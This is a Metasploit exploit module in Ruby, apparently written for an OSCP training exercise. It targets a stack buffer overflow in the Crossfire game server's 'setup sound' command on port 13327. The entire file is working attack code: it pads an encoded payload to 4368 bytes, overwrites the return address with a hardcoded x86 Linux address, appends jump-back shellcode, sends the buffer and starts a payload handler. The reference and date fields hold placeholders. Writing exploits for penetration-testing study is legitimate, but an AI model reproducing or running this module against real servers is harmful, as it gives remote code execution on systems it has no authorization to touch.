require 'msf/core'

  class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::Tcp

def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'Crossfire set sound B0f module',
      'Description'	=> %q{
        Required for OSCP exercise.},
      'Author'	=> [ 'AXANO' ],
      'Arch'		=> ARCH_X86,
      'Platform'	=> 'linux',
      'References'	=>
        [
          [ 'CVE', '?????' ],
          [ 'OSVDB', '?????' ],
          [ 'EDB', '?????' ]
        ],
      'Privileged'	=> false,
      'License'	=> MSF_LICENSE,
      'Payload'	=>
        {
          'Space' => 300,
          'BadChars' => "\x00\x0a\x0d\x20=",
        },
      'Targets'	=>
        [
          [ 'linux', { 'Ret' => 0x08134597 } ],
        ],
      'DefaultTarget'	=> 0,
      'DisclosureDate'  => '?????'
    ))

    register_options(
      [
        Opt::RPORT(13327)
      ],
      self.class
    )
  end


  def exploit
    connect


    sploit = "\x11(setup sound "
    sploit << payload.encoded
    sploit << rand_text_alpha_upper(4368 - payload.encoded.length)
    sploit << [target.ret].pack('V')
    sploit << "\x83\xc0\x0c\xff\xe0\x90\x90"
    sploit << "\x90\x00#"

    sock.put(sploit)
    handler
    disconnect

  end

end
